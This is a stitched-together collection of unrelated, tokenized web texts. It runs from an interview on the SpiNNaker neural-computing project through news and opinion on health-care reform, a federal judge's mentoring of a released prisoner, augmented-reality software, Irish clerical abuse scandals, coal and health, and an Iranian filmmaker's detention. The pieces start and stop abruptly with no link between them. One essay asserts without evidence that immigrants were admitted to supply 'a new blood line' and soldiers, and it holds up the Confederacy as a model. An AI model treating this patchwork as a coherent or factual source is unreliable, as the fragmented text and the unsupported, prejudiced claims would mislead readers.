They can basically push into the optimization corners , detect errors , manage the errors as they arise , and just sit right on the edge of acceptable error rates .
DVS is kind of doing this , but doing it blind .
With DVS you 've characterized the process off - line in some sense , and you know that at this clock frequency you need that voltage , but you may have a very big margin in that .
With the Razor technique you can actually go into that margin and find out where things really begin to go wrong and use that to get another factor of 1.5 or 2 improvement in power efficiency .
DB Speaking of new developments , can you tell us a bit about the SpiNNaker project that you 're leading at Manchester , which is addressing this grand challenge to develop a new style of computation that 's essentially more biologically based ?
SF
My current work is building a million - processor , massively parallel machine .
It 's a brain - modeling application , so we want to build very large event - driven neural networks .
We find that using very large numbers of small processors is a power - efficient approach to this problem .
One of the interesting things to observe as you get into biologically inspired architectures is that even with the best electronics we know how to build , we 're still many orders of magnitude less energy efficient than the biology we 're trying to model .
DB Although we 're closing the gap on that , which is exciting .
SF
We are closing the gap , but there 's a very long way to go .
If you look at what 's happening inside the brain , you see very low - voltage swings , 100 - millivolt logic swings , and very slow processing and communication , but very large amounts of it running in parallel .
What you also get there is good fault tolerance .
In the brain you lose about a neuron a second , and it keeps working just the same .
With the variability and loss of components that we 're going to see in the sub - 20 nanometer technology of the very near future , we 're going to have to understand how to do this tolerance stuff , how to work with chips where transistors fail and leave the game in massive numbers .
At the moment , I do n't think we have much idea of how to do that , except in memories where we can put error correction around them .
What we 're doing here is designing a chip multiprocessor on fairly old technology : it 's 130 nanometer , on which we 've been able to put about 20 ARM 968 cores with quite a lot of local memory , and each of these cores will be running realtime software , modeling fairly simple abstract spiking neurons .
These are models of brain cells that have 1,000 or 10,000 inputs and generate a local output , and the output is purely an asynchronous spike event , so all the communication inside the machine is little packets that simply carry information about spike events as they occur .
The simulation runs in realtime , so the machine has no requirement for any sort of global synchronization in each process .
It just runs in its own realtime domain , receiving incoming spike events and sending outgoing spike events as the neural models dictate , and implementing local learning algorithms based on neuroplasticity , which is close to the biological models that the neuroscientists say describe what happens in the biology .
DB
The initial goal of this is to attempt to model to some degree the way that human biology works so that you can perform some experiments once you have something that seems to reflect that well .
To leap forward , what are the consequences for that model of computation if you were to use it for what we 're trying to do today with computers ?
SF
There are basically two big research questions in this project .
The first is , can massively parallel computing accelerate our understanding of how the brain operates ?
We still really do n't know the fundamental principles at work in the information processing inside the brain , and that is a scientific grand challenge in its own right .
The second question reflects that back : as our understanding of brain function grows , are there lessons there that we can apply back into producing machines that are more power efficient , more reliable when built on unreliable components , and maybe easier to use ?
One of my standard frustrations with today 's computer technology is every time I get a new operating system or buy a new machine , I have to spend a month learning how to use it .
Why does n't it spend a month learning how to be used by me so I can just carry on doing my job the same way ?
All of that demands that we have better models of how humans work , and it 's simply an unknown area at the moment .
DB
It 's very exciting to think what all that might mean in terms of the way one develops systems and software going forward .
We do n't yet understand the computational model all that well , so one has to begin by looking at the first question before we can begin to think about how we might apply it for other purposes .
SF
Just to be clear , a big parallel computer modeled on the way the brain operates is not going to answer the question of how the brain works .
It 's going to provide a platform on which I hope we can get neuroscientists and psychologists and other people to test their hypotheses .
The machine is not going to solve the problem ; it 's going to provide the platform that I hope can be used to help solve the problem .

Andy Woods - Cooling the Data Center
Power generation accounts for about 40 to 45 percent of the primary energy supply in the US and the UK , and a good fraction is used to heat , cool , and ventilate buildings .
A new and growing challenge in this sector concerns computer data centers and other equipment used to cool computer data systems .
On the order of 6 billion kilowatt hours of power was used in data centers in 2006 in the US , representing about 1.5 percent of the country ’s electricity consumption .
David J. Brown , Charles Reams - Toward Energy - Efficient Computing
By now , most everyone is aware of the energy problem at its highest level : our primary sources of energy are running out , while the demand for energy in both commercial and domestic environments is increasing , and the side effects of energy use have important global environmental considerations .
The emission of greenhouse gases such as CO , now seen by most climatologists to be linked to global warming , is only one issue .
Eric Saxe - Power - Efficient Software
The rate at which power - management features have evolved is nothing short of amazing .
Today almost every size and class of computer system , from the smallest sensors and handheld devices to the " big iron " servers in data centers , offers a myriad of features for reducing , metering , and capping power consumption .
Without these features , fan noise would dominate the office ambience , and untethered laptops would remain usable for only a few short hours ( and then only if one could handle the heat ) , while data - center power and cooling costs and capacity would become unmanageable .
Alexandra Fedorova , Juan Carlos Saez , Daniel Shelepov , Manuel Prieto - Maximizing Power Efficiency with Asymmetric Multicore Systems
In computing systems , a CPU is usually one of the largest consumers of energy .
For this reason , reducing CPU power consumption has been a hot topic in the past few years in both the academic community and the industry .
In the quest to create more power - efficient CPUs , several researchers have proposed an asymmetric multicore architecture that promises to save a significant amount of power while delivering similar performance to conventional symmetric multicore processors .

Scott Brown 's election to the Senate has health care reform on life support .
With Congressional Democrats doubting whether it is feasible ( or even wise ) for them to press forward and pass the bill they spent the last year developing , one idea gaining traction is a " scaled - back " health bill that includes only the most popular aspects of reform .
Intuitively , it makes sense : if the bill is too toxic to pass , pick the parts the public likes and scrap the ones that are unpopular .
The polling even provides support for this approach -- while the bill itself is unpopular , many of its components are widely favored , with net approval of more than 30 points in a recent Kaiser Family Foundation survey .
Unfortunately , enacting just the popular parts of the bill ( which tend to be insurance regulations ) will explode premiums and make it harder than ever for uninsured people to find coverage .
This is n't just speculation -- it's what happened in New York when the state enacted similar insurance reforms without the " comprehensive " approach discussed in Washington .
In 1993 , New York adopted two of the most popular parts of the health care reform bill that recently passed the Senate : " guaranteed issue , " or a rule that insurers must sell to anyone , regardless of pre-existing conditions ; and " community rating , " which prevents insurers from setting premiums based on characteristics like age and sex .
( New York 's reform is more radical than proposed federal reforms , as it allows no variance at all on age ; the Senate bill would cap the amount of age - based difference ) .
New York did not require anybody to buy health insurance , nor did it give out subsidies to help people pay for it ( though it did expand government - provided insurance at vast taxpayer expense . )
These reforms were supposed to make it possible for more people to get insurance coverage .
Instead , what they did was drive premiums through the roof .
Now , the cheapest insurance plan for a family in New York City costs $ 26,040 , compared to a national average of around $ 13,000 .
Unsurprisingly , few New Yorkers find these prices affordable , and the share of New Yorkers with individually - purchased coverage has fallen by 96 % , to about 2 in 1000 .
Functionally , New York barely even has an individual insurance market anymore .
As a result , New York 's rate of uninsurance is in the middle of the pack nationally , even though the state ranks 4th in the share of residents on Medicaid .
New York experienced what is known as an " insurance death - spiral . "
Under community rating and guaranteed issue , healthy people found insurance premiums to be a bad deal and they dropped out .
This increased the average risk among insureds , so premiums rose once more , again driving the healthier and poorer participants to drop .
The process repeated itself until almost nobody found it worthwhile to buy their own insurance .
Contrast this experience with that in Massachusetts , whose 2006 reform ( " Romneycare " ) combines New York - style regulations with an individual mandate and subsidies .
( The Senate bill is similar to a national version of Romneycare ) .
Experts have reasonable disagreements about whether the Massachusetts reform has been worth its price tag .
But it is definitely not the unmitigated disaster we saw in New York , because the individual mandate prevents a death spiral .
Both the 2006 Massachusetts reforms and the currently - stymied Senate bill take a Rube Goldberg approach to insurance reform .
You include guaranteed issue and community rating to make sure insurance is available to everyone , and then impose an individual mandate to prevent a death spiral .
Then , you hand out subsidies so people can afford to comply with the mandate , and you raise taxes or cut other spending to pay for the subsidies .
These actions come as a package for a reason -- one part of reform offsets the bad side effects of another .
Enact them all and we can talk about whether they are worth their substantial cost .
But enact only some of them and the market will fall apart , like it did in New York .
When Americans say they want guaranteed issue and community rating but no individual mandate , they do n't mean they want insurance to be so unaffordable that nobody buys it .
They just do n't realize this will be the effect of the reforms they favor .
When I read the polls , I see the public telling Congress it wants to eat an all - ice cream diet and not get fat .
It 's a reasonable sentiment .
But Congress must deal in the art of the possible , and when the public finds its pants do n't fit anymore , it will blame the Congress that fed it all that ice cream .
The man , a thin and gray - haired federal judge , walked nervously up and down the streets of skid row , past drug dealers , pimps and thugs , past rows of men lying like glass - eyed zombies against concrete walls .
“ Excuse me , ” he said , pulling out a photograph , “ have you seen this man ? ”
He was met by blank faces or angry stares .
And , always , one word : “ No . ”
He could n’t give up .
Down more streets and through urine - soaked alleys .
He was the only white person he could see .
To Judge Spencer Letts , then 72 , this distinction did not matter .
What mattered was that Michael Banyard , an ex-con who had lived much of his adult life in prison , could be in trouble again .
Letts told himself that if he could just find him , Banyard would not run -- even if he were in a drug - induced stupor .
Instead , he would peer at the judge through his dreadlocks , smile his sheepish smile and the two would walk a few blocks to an entirely different world -- the judge ’s chambers inside the U.S. Central District Courthouse .
There they would sit , as they so often had , and Letts would try to convince his friend that the troubled man on skid row was not the real Banyard .
Not the man the judge believed in .
::
John Spencer Letts was born in St. Louis in 1934 , the privileged son of a vice president at Prudential Insurance .
He went to Yale , Harvard Law and , in the early 1960s , to a powerhouse litigation firm in Houston .
“ As a lawyer , ” he said , “ a lot of times I would fail .
But then one case would come up that everyone else was struggling with and I guess I would just look at it in a way that was different .
I would find a solution others would look past .
And that became my reputation : out of the box . ”
FOR THE RECORD : A previous version of the photo caption above said Letts has mentored several men he has put in jail , including Banyard .
Banyard was sentenced to prison by another judge ; Letts handled his appeal .
He took that reputation to Los Angeles , where in 1966 he became vice president at the budding high - tech conglomerate Teledyne .
As the company ’s legal chief , he burrowed deeply into his work , overseeing acquisitions .
He provided a life of comfort for his wife , two sons and daughter .
There were country clubs and boarding schools , tennis lessons and summer vacations at a home on a Michigan lake that had been in his family for generations .
He was a Republican but mostly steered clear of politics .
He was well - connected , however , with lawyers and businessmen who had ties with the White House , and that paid off .
President Reagan nominated Letts for an opening on the District Court .
Confirmed in 1986 , Letts proved unusual from the start .
At the courthouse , he spoke softly , tended to mumble , was prone to nervous laughter and would launch into asides on such subjects as the nature of time , the age of reason and the essential goodness of man .
After long periods of meandering , he ’d get back to the legal point and nail it .
Some lawyers hated going to his court .
He was n’t just hard to understand , his views and rulings were unpredictable .
Others saw him as a refreshing maverick who plowed through all manner of ideas before settling on a reasonable course .
“ He ’s a truth teller , unafraid to follow uncommon lines of thought as far as he can go , ” said veteran defense attorney Michael Proctor .
“ And that makes a lot of people uncomfortable . ”
The federal judiciary is stacked with former state judges and prosecutors who have spent years in courtrooms .
Because he had always preferred to settle cases as a lawyer , Letts had rarely been in court .
At first , there were basic procedures he did n’t know .
Moreover , he had no experience with many of the kinds of cases he would oversee , which came from a world of gangs , drugs and guns .
“ I was terrified , absolutely terrified , ” he said of his early days as a judge .
“ Street crime ?
What did I know about that ? ”
Meanwhile , he also was confronted with a new federal law that mandated long sentences for the sale or possession of crack , giving judges no leeway .
Unable to consider the context of cases , he grew indignant at being required to sentence wrongdoers to decade - long prison terms when he often felt they deserved far less .
His anger intensified when he saw that almost every defendant coming into his courtroom was black , even as statistics showed that most drug users were white .
He was struck by how smart many of them seemed , how driven .
Born into different circumstances -- into his circumstances -- some also might have become vice presidents at Teledyne , he figured .
“ I began to see that it is all too easy for a judge to just put a C for convicted on a guy ’s forehead and then to walk away like the guy is , and always will be , nothing , ” he said .
“ It hit me -- I am going to try my best , from then on , to extend myself , see their humanity and let them see mine . ”
He fought hard against mandatory sentences , calling them discriminatory and even unconstitutional , disparaging them in opinions that circulated in legal circles and earned him the ire of federal prosecutors .
Required to give a 10 - year prison term to a man with no criminal record who pleaded guilty to mailing a package containing crack , Letts asked for a presidential pardon .
The Reagan administration turned him down .
His fight became personal .
Sometimes , Letts would drive to the toughest parts of South Los Angeles , to housing projects and gang - ridden apartments , where he would visit the parents , siblings and cousins of those he had put in prison .
He would sit in their living rooms , ask about their lives , tell them he cared and counsel young ones not to run with the tough crowds .
When the men he sentenced got out of prison , he would ask a favor : that they keep him apprised of their progress .
“ My guys , ” he came to call them , noting that one became a basketball coach , another a construction worker and another a music producer .
“ My crack guys . ”
As proud as he was of all of them , none affected him the way Banyard did .
::
Michael Banyard was born in Compton in 1967 , the son of a truck driver and a beautician .
“ When I gave birth to Michael he had a 102 - degree fever , ” said his mother , Obie .
“ I remember the doctors putting him in an ice bath and I remember how terribly worried I was for my child .
That was the start . ”
His mother recalled that young Michael was sweet , shy and deeply affected by what happened around him .
When he was 5 , gang members broke into the family ’s home , rampaging through everything .
His mother never forgot the look on her son ’s face when the break - in was discovered : fear , helplessness and anger .
They were emotions he could never seem to shake .
His father left the family when Banyard was in grade school .
The men he looked up to were gangsters .
By 16 , he was one of them , a full - fledged member of the Compton Santana Crips who sold crack on the streets .
His gang name was Loco Mike .
That was one side of him .
The other was the polite , razor - smart , church - going teen who would retreat to his room for hours , hounded by shame for his street life , remembering childhood days when he would fall asleep on his father ’s chest .
At 17 , he turned to the drug he had been selling .
It was n’t long before crack owned him .
He sold his girlfriend ’s jewelry to pay for a high .
Then he hocked her Chrysler LeBaron to a stranger .
He went to a police station and begged to be arrested because he could n’t stop .
The cops told him to go home .
In 1988 , he was in a minor car wreck and stole $ 6 from the other driver .
He was arrested and convicted .
It was his first time in prison , his first felony .
Under California law , his first strike .
When he got out three years later , he fared well for a while , managing his mother ’s Inglewood beauty shop .
But one night he got high .
He fought with his girlfriend and she called the police .
He pleaded no contest to assault and was placed on probation .
It was his second strike .
By 1994 , he had lost every vestige of control over crack .
His addiction pushed him onto the forlorn patch of downtown streets that is skid row .
He was arrested for a string of petty crimes , but mostly the cases were dismissed .
When they were n’t , he got probation or a few weeks in jail .
Then he was back on the streets .
He no longer called his family , even his mother .
He smelled of urine , slept on sidewalks and underneath cars .
There were times when his clothing was stolen , so he fashioned pants out of large plastic garbage bags , tied at his waist .
One day , he made his way to a freeway overpass and looked down at the cars .
He was ready to jump .
But at the last moment he thought of his mother and stumbled away .
On Sept. 4 , 1996 , a stranger approached with crack .
Suddenly , cops swooped in .
They would later testify that they saw drugs drop to the ground as they approached , drugs Banyard had just bought .
It was less than a gram of crack , barely enough to fit under a fingernail .
That did n’t matter .
He was convicted and it was his third felony .
California ’s three - strikes law mandated that he be sent to prison for at least 25 years .
At the end of that time , his release would be subject to approval from a parole board .
He could die behind bars .
::
In prison , Banyard was free from drugs .
His mind cleared and his anger softened .
He gained a new sense of spirituality and spent almost all his time in the prison law library , preparing appeals .
A state court reviewed his case and turned him down .
A federal magistrate said his claims lacked merit .
The attorney general said he should remain in prison .
By 2002 , he was down to one last appeal -- to the U.S. District Court , where his case went to Letts .
The judge was approaching 70 then , working less and reflecting on his life .
He thought often of his father -- a steady , stealthy drinker late in life -- and of a cousin who became a fervent member of Alcoholics Anonymous .
He had empathy for their struggle .
He had his own dark bouts with depression and sometimes talked openly about them in court .
He understood how it felt to battle despair .
It was against this backdrop that he took Banyard ’s case .
“ I could n’t put my finger on it but it just rubbed me the wrong way , ” he said .
“ Twenty - five years , no guarantee of ever leaving , for that amount of cocaine ?
Something was wrong .
Very wrong . ”
He researched every aspect of the case , work that took 2 1/2 years .
Banyard ’s appeals were well crafted but needed sharpening .
The judge took the unusual step of hiring lawyers to help him .
On Oct. 4 , 2004 , Letts issued a 32 - page ruling .
Banyard was in his cell at the San Luis Obispo Men ’s Colony when he received the manila envelope .
As he opened it , his hands began to tremble .
He was so nervous , his cellmate had to read the ruling to him .
Letts wrote that the $ 6 robbery was “ outside the heartland of serious felonies that normally constitute . . . strikes under the Three Strikes Law . ”
He said Banyard ’s pre-appeal lawyers had let their client down and dismissed as irrelevant Banyard ’s history of petty crimes and arrests for which he was never prosecuted .
He said second - degree murderers , rapists and those guilty of voluntary manslaughter received lighter sentences than Banyard had .
Most important , he ruled that in Banyard ’s second strike , there had been a serious mistake :
The state court recorded it as an assault with a gun , but Banyard had actually pleaded no contest to simple assault .
“ That , ” Letts wrote , “ did not constitute a felony for purposes of the Three Strikes Law . ”
“ Banyard ’s sentence , ” the judge wrote , “ is grossly disproportionate to his offense and constitutes cruel and unusual punishment , in violation of the 8th Amendment . ”
Michael Banyard was freed .

( PhysOrg.com ) --
Software developed at Oxford University is making it possible to fuse real and 3D computer - generated visuals on the fly .
The Parallel Tracking and Mapping [ PTAM ] software is a camera - tracking system which maps the environment around you as seen through a camera and turns real world surfaces into platforms for virtual objects or characters without the need for pre-stored maps or tags .
The video above , showing PTAM working on iPhone , gives you an idea of how the software might be used .
It 's just been announced that the system has been licensed to augmented reality company QderoPateo LLC by Oxford ’s technology transfer company Isis Innovation .
QderoPateo will integrate the software into mobile phone applications , to provide novel advertising and other services .
‘ The blending of real and virtual worlds is common enough in films and television , but is usually achieved by extensive processing of the recorded images or by filming in studios with known objects at fixed locations , ' David Murray of Oxford University 's Department of Engineering Science , who led the work , told me .
' The PTAM software allows developers to augment a camera ’s video stream in real time and in everyday locations .
It allows developers to build augmented reality applications for consumer markets and education , both quickly and economically . '
The software builds a detailed 3D map containing thousands of features which can be tracked at a standard frame - rate with an accuracy rivalling that of model - based systems .
It can also recognise objects and scenes through the appearance of clusters of features that form a ' digital signature ' of the location .
As the map is built , the camera viewpoint and angle is calculated in such a way that 3D graphics can be projected into the video stream so that they appear to belong in the same scene .
On a smart phone PTAM can help improve the accuracy of sensors such as GPS and digital compasses and fill in when satellite , 3G and WiFi signals drop out .
One potential application is a PTAM - enabled app featuring an avatar ' guide ' who could appear in your camera view and lead you down the street towards a restaurant while explaining the menu and making your reservation .
QderoPateo have ambitious plans to grow the mobile augmented reality market and create an augmented reality search and gaming engine running for their ' Ouidoo ' smart phone - expected to make its debut at the Shanghai 2010 World Expo this spring ,
Isis Innovation is also looking for commercial partners who will develop the software for a variety of other useful applications .
Cardinal Sean Brady has said he will only resign if the Pope asks him to BBC Northern Ireland religious affairs presenter William Crawley considers the continuing impact of Catholic child abuse scandals in Ireland and beyond .
The BBC Northern Ireland radio phone - in show I hosted on Monday received a record number of texts as we debated Cardinal Sean Brady 's position .
Perhaps it 's another small sign of the increasing willingness by ordinary Catholics in Ireland to speak out against church leaders , another indication of the seismic cultural shifts that have taken place here in the past decade .
A culture of religious deference has been eroded by one scandalous story after another .
Eighty percent of the texts we got were hostile .
" He should resign immediately , " said one lifelong Catholic .
" He has no moral authority left , " added another .
One compared his unwillingness to resign to Bishop Margot Kaessmann , the leader of the Germany 's 24 million Lutherans , who stood down earlier this month because she was caught driving under the influence of alcohol .
Cardinal Brady's " offence " was vastly more serious , according to the listener .
This weekend , he admitted that he represented the church at meetings in 1975 , long before he became a bishop himself , when two victims of the serial child abuser Father Brendan Smyth were asked to sign an oath of silence about their complaints .
The victims were aged 14 and 15 .
Brendan Smyth is thought to have abused hundreds of children Brendan Smyth later moved to other dioceses and countries , where he continued to abuse children for another 20 years .
When he was eventually brought to justice , he pleaded guilty in dozens of cases of abuse ; it is thought that his victims number in the hundreds .
Smyth died in prison in 1998 , but not before an extradition controversy related to his case led to the collapse of the Irish Republic 's Labour / Fianna Fail coalition government .
In December , Sean Brady told a reporter that he would feel obliged to resign if any act or omission on his part " had allowed or meant that other children were abused " .
Cardinal Brady now faces calls from victims campaigners to keep his word and resign as Irish primate .
He says he was merely following orders from his superiors .
Some victims of clerical abuse have pointedly reminded him that this argument did n't work in Nuremberg in 1945 , and it does n't work now .
Many Catholics are still reeling from two major state reports which chronicled decades of child abuse in church - run institutions and an organised cover - up of rape and molestation allegations by senior church leaders in the archdiocese of Dublin .
In the wake of the latest report , four bishops were forced to resign .
The entire Irish hierarchy were summoned to the Vatican to give an account of themselves in person before Pope Benedict .
And the Irish church now waits to receive an unprecedented Pastoral Letter from the Pope addressing the church 's future in the light of the most recent scandals .
Psychologists have noted that the willingness of victims in one jurisdiction to go public can encourage victims in other jurisdictions to do the same .
As Cardinal Brady fights for his career - he said he will only resign if Pope Benedict asks him to - there are signs that the Irish church 's sex scandal is triggering aftershocks across Europe .
Pope Benedict has had to deal with sex abuse scandals in various countries Last month , reports began to surface of historic abuse cases in several elite Jesuit boarding schools in Germany .
The German Catholic Church is now dealing with multiplying new reports of physical and sexual abuse , including some linked to a renowned choir once led by Pope Benedict 's brother , Fr Georg Ratzinger .
As the domino effect of reporting continues , the wave of abuse revelations reached the Netherlands by late February , with scores of victims coming forward .
Crisis By March , the scandal had spread to Switzerland , where 60 new cases have now come to light .
And in the past few weeks , more abuse cases have emerged in Austria and Poland .
This weekend , a Vatican spokesman denounced " aggressive " efforts by the media to personally implicate the Pope in the unfolding child abuse crisis as questions were raised about the handling of a priest accused of molestation in the Archdiocese of Munich and Freising when the future Pope was archbishop in the late 1970s and early 1980s .
Last Friday , the Pope met the President of the German Bishops ' Conference to discuss the wider sex abuse crisis , just as an archbishop in Austria was breaking ranks to call for a public discussion about the future of the mandatory celibacy rule for priests .
Some informed Vatican sources now predict that the text of Pope Benedict 's pastoral letter to the Irish church will need to be expanded to include churches across Europe as full realisation dawns that the clerical sex abuse crisis now facing the church is a European problem , not just an Irish one .

Last year , rhino poaching worldwide hit a 15 - year high due to increased demand for rhino horn .
A recent report by TRAFFIC and IUCN , the International Union for the Conservation of Nature , showed that since 2006 , 95 percent of the poaching in Africa has occurred in Zimbabwe and South Africa .
Furthermore the report analyzes poaching incidents by month and through certain countries .
It is a good reminder of the issues conservation leaders faced around CoP14 last year and the events and statistics leading to CoP15 which takes place in a few weeks .
Most rhino horns leaving southern Africa are destined for medicinal markets in southeast and east Asia , especially Vietnam , where demand has escalated in recent years .

More toys for the rich ..
Dallas Cowboys outside linebacker DeMarcus Ware is scheduled to undergo surgery Thursday to shave down a bone spur on his left foot .
Ware wanted to wait until after the Pro Bowl , which he played in earlier this month , before having the procedure .
Ware , who led the Cowboys with 11 sacks and led the NFL in quarterback pressures , battled through injuries for most of the year .
He sustained a severely sprained neck against San Diego on Dec. 13 and was carted off the field on a gurney .
Despite the belief that he would miss two games , returned to play the following week vs. New Orleans .
Ware also suffered from back stiffness , a chipped bone in his left wrist and a stress fracture in his left foot .
However , he did n't miss any games and finished the season with 57 tackles and five forced fumbles .
Calvin Watkins covers the Cowboys for ESPN Dallas .

During the second half of the twentieth century , the United States economy prospered based on a very simple , but unsustainable factor , growth .
Growth in population , the maturing of the growing population , the growing markets overseas , and the opening of the US market to both overseas competition and overseas investment .
In the first decade of the twenty - first century overly extended credit was also used to propel the US economy , though those days have come to end for the individual consumer , though not quite … for the federal government who continues to spend without restraint .
Now , before we go further , I have no degree in economics , and nothing but personal observation to support my theory of American economic success in the past , and my theory for what should be considered in the future .
Let 's start with the premise that American economic prosperity was built on growth , specifically domestic population growth , and the opening of new overseas markets .
The original idea being to find more consumers who could afford to purchase goods and services manufactured in the United States .
As the post World War II generations aged more and more people came into the household market place .
Each new household not only needed a residence , whether it be rental or owned , but they needed an automobile , household furnishing , and appliances , electronic gadgets , clothes , food , etc .
As the population continued to expand , consumer demand sustained business expansion .
Development of stock market products such as mutual funds and retirement plans helped provide the necessary capital to not only make capital improvements to American industries , but provided a means to marshal capital for new industries in communications and artificial intelligence .
With the end of World War II , the redevelopment of western Europe and Japan initially provided markets for American goods .
Though with time , these nations began to create competitors for American goods .
An early example was Japanese cameras … but that spread too many almost all goods available in the United States .
And as labor and infra-structure costs within America continued to rise , foreign goods were needed to sustain the living standards of Americans .
When domestic industries like housing construction sagged because of Women 's liberation , the smaller American family , and less and less rising American consumers , opening the borders to tens of millions of illegals placed a new demand for housing , furnishings and appliances .
It is placed a demand on school districts for the teachers pouring out America 's colleges .
The illegals placed a demand at the bottom of the American place which pushed everyone else up .
We have heard from our own government the crisis with Social Security because the base line of the pyramid has shrunk dramatically .
Modern social engineering ; the demeaning of motherhood and the traditional family flat lined American population growth , with a long term outlook of a shrinking population on the horizon .
But besides the obvious present day economic troubles connected with a shrinking population came the even more perilous fact that Asian mainland nations like the People Republic of China and India were two to four times larger than the United States with a potential to literally overwhelm the US in the mid to late 21st century .
So letting in the illegals was not only about creating an economic demand on the system but injecting a new blood line with an appetite for larger families .
And a secondary benefit was the military application of Latin youth in wars to preserve Israeli security and protect access to large energy reserves .
And so here we are .
Our economy is collapsing ; the American marketplace has been captured by overseas competitors .
The American industry that has survived has been largely taken over by foreign investment .
America , as a nation is a shell of what it once was .
So , is the situation hopeless ?
Is America destined to become a secondary neighborhood of Europe , and a migration point for South Americans ?
Is national sovereignty dead ?
Is there no chance of re-establishing an American economy ?
I would suggest that preservation of the American model is possible , though it may not look like the America of early times , either in borders , or in political philosophy .
The men who formed the Confederate States of America , in Montgomery , Alabama , in 1861 , anticipated many of the problems we face today .
Within their constitution they took steps to protect their new southern nation , and its citizens .
For one thing , within the Confederate Constitution they placed a premium on being born in the South by making domestic birth a requirement for holding elected office .
They placed a priority on retaining an agricultural basis , and limited dependence on domestic population growth for economic prosperity .
Other wise changes to the Constitution included severely restricting the ability of Congress to increase spending , providing the President with line item veto authority and one six year term .
The Constitution strictly prohibited the government from enacting bail outs for industries !
The future of America , if it is to retain its national identity , and economy must in some ways look like the Confederacy , though in other ways it needs to reject the Confederate Constitution .
For example , the Confederate were more than a century ahead of globalism , relying on open borders to trade to provide most goods needed by the people of the South .
In the American future , national self - sufficiency should be the goal .
That is not to say we can provide for all our own needs , but it rather that we should lean in that direction .
If America is the nation of exceptionalism , as Rush Limbaugh so often says , than we should be able to produce quality , affordable cars , televisions , computers , etc .
At present our nation is shifting towards socialism .
That must be reversed .
Government workers cannot out earn their private sector counter parts …
The very opposite should be the case .
Because government employees are shielded from layoffs and competition , their salary – benefit structure should reflect that , being significantly lower .
This would range across everything from education to health care .
Buy American should be a hallmark of the new 21st Century America .
But this Buy America cannot be by restricting foreign goods , as it should be by policies which encourage innovation in American goods .
If existing American car companies can't compete … let them go bankrupt , and encourage the creation of new , American owned manufacturers .
Either all these schools and colleges can make our economy as good as it was before they existed , or they should be shut down , and we should go back to what worked previously , hard work , self education , and internal domestic competition .
Lastly , we need to move away from the idea that making more widgets , selling more widgets is the best way to prosper .
The key to long term economic prosperity is quality over quantity , and development of goods that fit the needs of the individual consumer .
Variation , ingenuity and quality of craftsmanship should be the hallmarks of the new American business world .
Of course , besides a redesigning of the American economic base , there is a need to re-instill citizenship , national pride , and patriotism .
In addition , Americans must return to their Christian faith .

Joshua Frank , co-author with Jeffrey St. Clair of Red State Rebels : Tales of Grassroots Resistance in the Heartland , looks at a new report that provides damning evidence of the effects of coal on public health .
SO YOU thought smoking cigarettes was bad for your health ?
Try living next to a coal - fired power plant .
That 's the diagnosis that Physicians for Social Responsibility ( PSR ) relayed to the public in a comprehensive medical study released on November 18 called " Coal 's Assault of Human Health . "
In it , the organization , comprised of physicians and public health experts , claims that coal pollutants damage every major organ in the human body and contribute to four of the top five leading causes of death in the United States .
Not since NASA 's James Hansen rang the global warming alarm about coal 's major contribution to climate change has there been a more dire call to shut down coal operations in the United States .
It is not simply about cleaning up the coal process ; it is about halting its production altogether in order to immediately save lives .
At every stage in its life cycle , coal can negatively impact human health , from mining operations , cleaning , transportation to burning and disposing of the combustion waste .
PSR reports that many Americans are being affected daily by coal and the exposure is contributing to horrible health problems ; heart attacks , lung cancer , strokes and asthma , among others .
A coal - burning power plant near Rochester , N.Y. ( Michael Hanlon )
" The findings of this report are clear : while the U.S. relies heavily on coal for its energy needs , the consequences of that reliance for our health are grave , " said Dr. Alan H. Lockwood , a principal author of the report and a professor of neurology at the University at Buffalo .
RECENTLY , COALSWARM * , an environmental group that monitors coal issues , released a list of 126 coal - fired power plants that are surrounded by 10,000 people or more living within a three - mile radius .
Most of these hundreds of thousands of Americans are being exposed to deadly coal particulates without even knowing it .
The majority of the plants are not equipped with the most up - to - date sulfur dioxide reduction equipment , which contributes to lung and heart disease .
However , instead of upgrading this technology on coal burners , which can cost hundreds of millions of dollars , a growing number of activists in the climate change movement are pushing for facilities to be closed instead , for the upgrades are essentially prolonging the life of plants that are still polluting in many other ways .
The Obama administration does not seem to be listening .
Last June , the Department of Energy poured $ 1 billion into relaunching FutureGen , a project that intends to show how a plant can capture carbon emissions .
" The FutureGen project holds great promise as a flagship facility to demonstrate carbon capture and storage at commercial scale , " U.S Secretary of Energy Steven Chu said at the time .
" Developing this technology is critically important for reducing greenhouse gas emissions in the U.S. and around the world . "
Chu espouses the notion that coal can be clean , but the FutureGen endeavor , like all other " clean coal " projects , is greenwashing at its dirtiest .
Whenever coal is burned , it releases numerous toxins , and these pollutants have to go somewhere .
If not into the air , they will be have to be captured and buried underground , most likely in communities that do not have the resources to fight the coal waste depositories .
Indeed , the coal industry is spending $ 35 million annually to promote their clean - coal technology , which at this point is nothing more than an advertising motto conjured up by high - paid PR firms .
However , the money that coal companies are spending , not only on public relations , but also on lobbying , seem to be paying off .
The current climate legislation hurdling its way through Congress is laden with huge subsidies for the coal industry .
Last May , when the House of Representatives released a version of the climate bill , it became clear which direction the law was heading .
In Section 114 of the draft , the coal lobby was able to shore up $ 11 billion over the next 10 years in a new carbon tax that coal companies would collect and then spend through a private corporation they operate and control .
The money would finance , not renewable energy sources , but new coal - fired power plants .
While politicians and industry folks believe coal ought to be a part of our energy future , others admittedly disagree .
The PSR report is a raucous call that our current addiction to dirty coal is not only unsustainable and a major source of global warming pollution , it is also extremely deadly to human life .
No matter how much money the coal industry throws at the issue , either in an attempt to mitigate coal 's contribution to health problems or to have us believe that coal can be " clean " -- people are dying , approximately 24,000 every single year .
" These stark conclusions leave no room for doubt or delay , " says Kristen Welker - Hood , PSR 's director of environment and health programs .
" The time has come for our nation to establish a health - driven energy policy that replaces our dependence on coal with clean , safe alternatives .
Business as usual is extracting a deadly price on our health .
Coal is no longer an option . "

( New York ) - Iran 's Judiciary should immediately clarify the reasons behind a raid on the home of film director Jafar Panahi as well as the legal basis for detaining him and two of his colleagues , Human Rights Watch said today .
According to accounts published on various websites , including the BBC , plainclothes security agents raided Panahi 's home on the evening of March 1 , 2010 .
They searched his home , confiscated some of his personal belongings , and then arrested Panahi , his wife , adult daughter , and 15 filmmakers and actors .
Panahi's son said that Panahi and his guests had been convening a meeting about an upcoming film when intelligence agents arrived .
Panahi and two others remain in detention .
" It has been almost two weeks since Panahi and his two colleagues were detained but the Iranian Judiciary has failed to provide any reason for continuing to lock them up , " said Sarah Leah Whitson , Middle East director at Human Rights Watch .
" The Iranian authorities should either charge these men or release them immediately . "
